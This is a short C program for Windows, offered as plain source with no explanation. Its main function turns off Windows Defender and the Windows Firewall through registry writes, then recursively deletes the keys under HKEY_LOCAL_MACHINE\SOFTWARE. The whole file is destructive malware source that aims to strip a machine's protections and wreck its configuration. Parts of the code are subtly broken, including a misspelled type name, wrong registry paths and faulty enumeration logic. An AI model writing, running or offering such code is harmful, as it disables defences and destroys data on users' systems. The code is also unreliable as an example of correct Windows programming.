#include <windows.h>
#include <stdio.h>

#define MAX_KEY_NAME 255

// Function to disable Windows Defender
void disable_windows_defender() {
    HKEY hKey;
    LONG lResult;

    // Open the registry key
    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows Defender"), 0, KEY_SET_VALUE, &hKey);

    if (lResult == ERROR_SUCCESS) {
        // Set the DisableState value to 1 to disable Windows Defender
        DWORD value = 1;
        lResult = RegSetValueEx(hKey, TEXT("DisableState"), 0, REG_DWORD, (CONSTUCHAR*)&value, sizeof(DWORD));

        // Close the registry key
        RegCloseKey(hKey);
    }
}

// Function to disable Windows Firewall
void disable_windows_firewall() {
    HKEY hKey;
    LONG lResult;

    // Open the registry key
    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Windows Firewall\\Settings\\StandardProfile"), 0, KEY_SET_VALUE, &hKey);

    if (lResult == ERROR_SUCCESS) {
        // Set the DWORD value to 0 to disable Windows Firewall
        DWORD value = 0;
        lResult = RegSetValueEx(hKey, TEXT("EnableFirewall"), 0, REG_DWORD, (CONSTUCHAR*)&value, sizeof(DWORD));

        // Close the registry key
        RegCloseKey(hKey);
    }
}

// Function to delete all registry entries under a key
void delete_registry_entries(HKEY hKey) {
    LONG lResult;

    // Get the number of subkeys
    DWORD nSubKeys, i;
    lResult = RegQueryInfoKey(hKey, NULL, NULL, NULL, &nSubKeys, NULL, NULL, NULL);

    if (lResult == ERROR_SUCCESS) {
        for (i = 0; i < nSubKeys; i++) {
            CHAR szKeyName[MAX_KEY_NAME];
            DWORD dwSize = MAX_KEY_NAME;

            // Get the name of the subkey
            lResult = RegEnumKeyEx(hKey, i, szKeyName, &dwSize, NULL, NULL, NULL, NULL);

            if (lResult == ERROR_SUCCESS) {
                // Open the subkey
                HKEY hSubKey;
                lResult = RegOpenKeyEx(hKey, szKeyName, 0, KEY_ALL_ACCESS, &hSubKey);

                if (lResult == ERROR_SUCCESS) {
                    // Recursively delete subkey entries
                    delete_registry_entries(hSubKey);

                    // Close the subkey
                    RegCloseKey(hSubKey);
                }
            }
        }

        // Delete the main key
        lResult = RegDeleteKey(hKey, NULL);
    }
}

int main() {
    // Disable Windows Defender
    disable_windows_defender();

    // Disable Windows Firewall
    disable_windows_firewall();

    // Open the registry key
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE"), 0, KEY_ALL_ACCESS, &hKey);

    if (lResult == ERROR_SUCCESS) {
        // Delete all registry entries under "SOFTWARE"
        delete_registry_entries(hKey);

        // Close the registry key
        RegCloseKey(hKey);
    }

    return 0;
}
